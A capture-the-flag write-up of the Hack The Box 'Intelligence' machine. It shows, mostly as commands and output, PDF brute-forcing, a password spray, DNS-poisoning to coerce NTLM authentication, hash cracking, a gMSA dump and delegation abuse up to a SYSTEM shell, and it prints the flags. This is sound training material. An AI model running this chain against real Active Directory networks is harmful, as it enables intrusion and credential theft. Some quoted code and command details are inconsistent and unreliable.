Author: Faridd

### HTB Write-Up: Intelligence

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Intelligence)|
| Difficulty | Medium                                                            |
| OS         | Windows                                                           |
| Date       | November 14, 2026                                                 |

---

#### Table of Contents
1. [Reconnaissance — Rustscan & Website Review](#1-reconnaissance--rustscan--website-review)
2. [Credential Discovery — Automated PDF Harvesting & Metadata Mining](#2-credential-discovery--automated-pdf-harvesting--metadata-mining)
3. [Initial Access — Default Password Spray](#3-initial-access--default-password-spray)
4. [Enumeration — BloodHound Chain & Scheduled Script Discovery](#4-enumeration--bloodhound-chain--scheduled-script-discovery)
5. [Lateral Movement — DNS Record Poisoning to Coerce & Crack Ted Graves' Hash](#5-lateral-movement--dns-record-poisoning-to-coerce--crack-ted-graves-hash)
6. [Privilege Escalation — gMSA Password Dump & Delegation Abuse to Domain Admin](#6-privilege-escalation--gmsa-password-dump--delegation-abuse-to-domain-admin)

---

#### 1. Reconnaissance — Rustscan & Website Review

```bash
rustscan -a 10.129.102.164 --ulimit=5000
```

**Open Ports:**

```
Open 10.129.102.164:53
Open 10.129.102.164:80
Open 10.129.102.164:88
Open 10.129.102.164:135
Open 10.129.102.164:139
Open 10.129.102.164:389
Open 10.129.102.164:464
Open 10.129.102.164:3268
Open 10.129.102.164:3269
Open 10.129.102.164:445
Open 10.129.102.164:636
Open 10.129.102.164:9389
```

The port set confirms a Domain Controller for **`intelligence.htb`**. Port 80 hosted a document portal where files could be downloaded — browsing it revealed the filenames followed a predictable, date-structured pattern (`YYYY-MM-DD-upload.pdf`), which meant every document on the site could likely be enumerated programmatically rather than clicked through by hand.

---

#### 2. Credential Discovery — Automated PDF Harvesting & Metadata Mining

##### 2.1 — Bulk-Downloading Every Document

A small script was written to brute-force every plausible date in 2020 against the upload naming pattern and save any file that returned successfully:

```python
import requests

def req(url):
    resp = requests.get(url)
    if resp.status_code == 200:
        print("Find: ", middle + ext)
        return resp.content
    else:
        return None

base = 'http://intelligence.htb/documents/2020-'
ext = '-upload.pdf'

for i in range(12):
    i += 1
    mon = '0' + str(i) if i < 10 else str(i)
    for j in range(31):
        j += 1
        day = '0' + str(j) if j < 10 else str(j)
        middle = mon + '-' + day
        url = base + middle + ext
        content = req(url)
        if content:
            with open(middle + ext, 'wb') as f:
                f.write(content)
```

```bash
python3 req.py
```

**Result (trimmed):**

```
Find:  01-01-upload.pdf
Find:  01-02-upload.pdf
...
Find:  12-28-upload.pdf
Find:  12-30-upload.pdf
```

##### 2.2 — Reviewing the Documents

Among the dozens of PDFs retrieved, two stood out:

```
http://intelligence.htb/documents/2020-06-04-upload.pdf
```

> Please login using your username and the default password of: **`NewIntelligenceCorpUser9876`**

```
http://intelligence.htb/documents/2020-12-30-upload.pdf
```

> Internal IT Update — There has recently been some outages on our web servers. Ted has gotten a script in place to help notify us if this happens again. Also, after discussion following our recent security audit we are in the process of locking down our service accounts.

This gave two valuable leads: a **default password** used company-wide for new accounts, and a hint that an IT staffer named **Ted** maintains an automated monitoring script — both become central to the rest of the chain. The idea then was to find the actual employee whose account still used that default password, by identifying who owns which document.

##### 2.3 — Extracting Usernames from PDF Metadata

Each PDF's **Creator** metadata field records the name of the employee who generated it:

```bash
for i in ~/Downloads/Intelligence/*.pdf; do
  exiftool "$i" | grep Creator | cut -d ':' -f2 | xargs
done
```

**Result (trimmed):**

```
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
...
```

After deduplicating, this produced a list of **84 unique usernames** — a full employee roster harvested entirely from document metadata.

---

#### 3. Initial Access — Default Password Spray

##### 3.1 — Spraying the Default Password

```bash
netexec smb 10.129.102.164 -u users -p 'NewIntelligenceCorpUser9876'
```

**Result:**

```
[-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
[-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
[+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

One account, **`Tiffany.Molina`**, had never changed the default onboarding password — giving a foothold.

##### 3.2 — Share Enumeration

```bash
netexec smb 10.129.102.164 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
```

**Result:**

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
IT              READ            
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
Users           READ            
```

##### 3.3 — User Flag

```bash
smbclient //10.129.102.164/Users -U "Tiffany.Molina%NewIntelligenceCorpUser9876"
smb: \> cd \Tiffany.Molina\Desktop
smb: \Tiffany.Molina\Desktop\> get user.txt
```

```bash
cat user.txt
1ad5d7635895a0b4f8e2867e564e1bc5
```

`Tiffany.Molina` had no WinRM access:

```bash
netexec winrm 10.129.102.164 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
# access denied
```

---

#### 4. Enumeration — BloodHound Chain & Scheduled Script Discovery

BloodHound analysis mapped out the following privilege chain:

```
TED.GRAVES --MemberOf--> ITSUPPORT --ReadGMSAPassword--> SVC_INT$ --AllowedToDelegate--> DC
```

**`Ted.Graves`** belongs to the **`ITSUPPORT`** group, which holds **ReadGMSAPassword** over the **`SVC_INT$`** gMSA computer account. That account, in turn, holds **constrained delegation** rights onto the Domain Controller itself. Getting `Ted.Graves`' credentials is therefore the key that unlocks this whole chain.

##### 4.1 — Finding the Monitoring Script

The `IT` share (already visible from Tiffany's share listing) was explored:

```bash
smbclient //10.129.102.164/IT -U "Tiffany.Molina%NewIntelligenceCorpUser9876"
smb: \> recurse on
smb: \> ls
```

**Result:**

```
downdetector.ps1                    A     1046
```

```bash
smb: \> get downdetector.ps1
```

```powershell
cat downdetector.ps1
```

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*") {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

This script, running every 5 minutes under **Ted Graves'** own account, queries AD-integrated DNS for any record whose name starts with `web*` and sends an authenticated HTTP request to it using `-UseDefaultCredentials` — meaning Ted's own NTLM credentials are automatically used to authenticate to whatever hostname is found, with no prompt. Since the script trusts *any* DNS record matching `web*`, creating a new matching DNS record under the attacker's control would cause Ted's machine to authenticate to the attacker instead.

---

#### 5. Lateral Movement — DNS Record Poisoning to Coerce & Crack Ted Graves' Hash

##### 5.1 — Planting a Malicious DNS Record

Using Tiffany's credentials (which had sufficient rights to create DNS records), a new `web1` record was added pointing to the attacker's IP:

```bash
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' --action add --record web1 --data 10.10.14.25 10.129.102.164 --action modify
```

**Result:**

```
[+] Bind OK
[+] LDAP operation completed successfully
```

##### 5.2 — Catching the Coerced Authentication

```bash
sudo responder -I tun0
```

On its next scheduled run, the monitoring script resolved `web1` to the attacker's IP and sent an authenticated request there, which Responder captured:

**Result:**

```
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:5c7adbdc1d3103af:DF4F64E57D32DA387C2C0730AA3C794C:...
```

Ted Graves' NTLMv2 hash was captured.

##### 5.3 — Cracking the Hash

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
...:Mr.Teddy
```

Ted Graves' password was cracked: **`Mr.Teddy`**.

---

#### 6. Privilege Escalation — gMSA Password Dump & Delegation Abuse to Domain Admin

##### 6.1 — Reading the gMSA Password

With valid credentials for `Ted.Graves` (a member of `ITSUPPORT`, which holds `ReadGMSAPassword` over `svc_int$`), the gMSA's password hash was read directly:

```bash
netexec ldap dc.intelligence.htb -u Ted.Graves -p 'Mr.Teddy' --gmsa
```

**Result:**

```
Account: svc_int$             NTLM: 67a538aeaef84d68dbd6ef663f5b1d52     PrincipalsAllowedToReadPassword: ['DC$', 'itsupport']
```

##### 6.2 — Abusing Constrained Delegation to Impersonate Administrator

`svc_int$` holds delegation rights onto the DC, meaning it's trusted to request service tickets on behalf of other users. Using the recovered NT hash, a service ticket was requested while impersonating the Administrator:

```bash
impacket-getST -spn www/dc.intelligence.htb -impersonate Administrator -hashes :67a538aeaef84d68dbd6ef663f5b1d52 -dc-ip 10.129.102.183 intelligence.htb/svc_int
```

**Result:**

```
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

This produced a service ticket valid for authenticating to the DC's `www` service as Administrator, thanks to `svc_int$`'s pre-configured constrained delegation.

##### 6.3 — Shell as SYSTEM via PsExec

```bash
export KRB5CCNAME=Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
psexec.py -k -no-pass dc.intelligence.htb
```

**Result:**

```
[*] Found writable share ADMIN$
[*] Creating service ZmuH on dc.intelligence.htb.....
[*] Starting service ZmuH.....

C:\Windows\system32> whoami
nt authority\system
```

##### 6.4 — Root Flag

```cmd
C:\Users\Administrator\Desktop> type root.txt
28564d9ebfc3f72cffb07d07a4aba4f6
```
